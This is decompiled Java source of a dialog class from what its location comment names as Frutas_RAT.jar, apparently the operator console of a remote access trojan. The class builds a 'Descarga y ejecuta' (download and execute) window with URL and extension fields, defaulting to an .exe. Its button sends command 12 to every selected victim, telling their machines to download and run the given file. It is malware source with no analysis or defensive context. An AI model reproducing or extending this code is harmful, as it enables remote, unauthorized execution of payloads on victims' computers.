/*     */ package cliente;
/*     */ 
/*     */ import java.awt.Color;
/*     */ import java.awt.Container;
/*     */ import java.awt.Font;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.awt.event.ActionListener;
/*     */ import java.util.ResourceBundle;
/*     */ import javax.swing.GroupLayout;
/*     */ import javax.swing.GroupLayout.Alignment;
/*     */ import javax.swing.GroupLayout.ParallelGroup;
/*     */ import javax.swing.GroupLayout.SequentialGroup;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JInternalFrame;
/*     */ import javax.swing.JLabel;
/*     */ import javax.swing.JTextField;
/*     */ import javax.swing.LayoutStyle.ComponentPlacement;
/*     */ 
/*     */ public class DescargaYEjecuta extends JInternalFrame
/*     */   implements SoporteLenguaje
/*     */ {
/*     */   private Usuario[] user;
/*     */   private String titulop;
/*     */   private JTextField ext;
/*     */   private JButton jButton1;
/*     */   private JLabel jLabel1;
/*     */   private JLabel jLabel2;
/*     */   private JTextField url;
/*     */ 
/*     */   public DescargaYEjecuta(Usuario[] us, ResourceBundle rb)
/*     */   {
/*  22 */     initComponents();
/*  23 */     this.user = us;
/*  24 */     if (this.user.length > 1) {
/*  25 */       setTitle(getTitle() + " Mensaje a " + us.length + " usuarios");
/*  26 */       this.titulop = (" Mensaje a " + us.length + " usuarios");
/*     */     } else {
/*  28 */       setTitle(getTitle() + this.user[0].getIdentificador());
/*  29 */       this.titulop = this.user[0].getIdentificador();
/*     */     }
/*  31 */     changeLenguage(rb);
/*     */   }
/*     */ 
/*     */   private void initComponents()
/*     */   {
/*  43 */     this.url = new JTextField();
/*  44 */     this.jLabel1 = new JLabel();
/*  45 */     this.jLabel2 = new JLabel();
/*  46 */     this.ext = new JTextField();
/*  47 */     this.jButton1 = new JButton();
/*     */ 
/*  49 */     setBackground(new Color(255, 255, 153));
/*  50 */     setClosable(true);
/*  51 */     setIconifiable(true);
/*  52 */     setTitle("Descarga y ejecuta");
/*  53 */     setToolTipText("");
/*     */ 
/*  55 */     this.url.setBackground(new Color(255, 255, 153));
/*  56 */     this.url.setFont(new Font("Times New Roman", 1, 12));
/*  57 */     this.url.setForeground(new Color(0, 0, 153));
/*  58 */     this.url.setText("http://www.google.com/as.zip");
/*     */ 
/*  60 */     this.jLabel1.setFont(new Font("Times New Roman", 1, 14));
/*  61 */     this.jLabel1.setText("URL");
/*     */ 
/*  63 */     this.jLabel2.setFont(new Font("Times New Roman", 1, 14));
/*  64 */     this.jLabel2.setText("Ext");
/*     */ 
/*  66 */     this.ext.setBackground(new Color(255, 255, 153));
/*  67 */     this.ext.setFont(new Font("Times New Roman", 1, 12));
/*  68 */     this.ext.setForeground(new Color(0, 0, 153));
/*  69 */     this.ext.setText("exe");
/*     */ 
/*  71 */     this.jButton1.setFont(new Font("Times New Roman", 1, 12));
/*  72 */     this.jButton1.setText("Enviar Comando");
/*  73 */     this.jButton1.addActionListener(new ActionListener() {
/*     */       public void actionPerformed(ActionEvent evt) {
/*  75 */         DescargaYEjecuta.this.jButton1ActionPerformed(evt);
/*     */       }
/*     */     });
/*  79 */     GroupLayout layout = new GroupLayout(getContentPane());
/*  80 */     getContentPane().setLayout(layout);
/*  81 */     layout.setHorizontalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addContainerGap().addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING).addComponent(this.jButton1, -2, 128, -2).addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addComponent(this.jLabel1).addComponent(this.url, -2, 186, -2))).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addComponent(this.jLabel2).addComponent(this.ext, -2, 37, -2)).addContainerGap(-1, 32767)));
/*     */ 
/*  96 */     layout.setVerticalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addContainerGap().addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING).addGroup(layout.createSequentialGroup().addComponent(this.jLabel2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.ext, -2, -1, -2)).addGroup(layout.createSequentialGroup().addComponent(this.jLabel1).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.url, -2, -1, -2))).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jButton1).addContainerGap(16, 32767)));
/*     */ 
/* 114 */     pack();
/*     */   }
/*     */ 
/*     */   private void jButton1ActionPerformed(ActionEvent evt) {
/* 118 */     String tst = this.url.getText() + "#" + this.ext.getText();
/*     */ 
/* 120 */     for (int i = 0; i < this.user.length; i++) {
/* 121 */       this.user[i].sendComando(12, tst);
/*     */     }
/*     */ 
/* 124 */     dispose();
/*     */   }
/*     */ 
/*     */   public void changeLenguage(ResourceBundle rb)
/*     */   {
/*     */   }
/*     */ }

/* Location:           C:\Users\Danilo\Desktop\Coisas\Frutas_RAT.jar
 * Qualified Name:     cliente.DescargaYEjecuta
 * JD-Core Version:    0.6.2
 */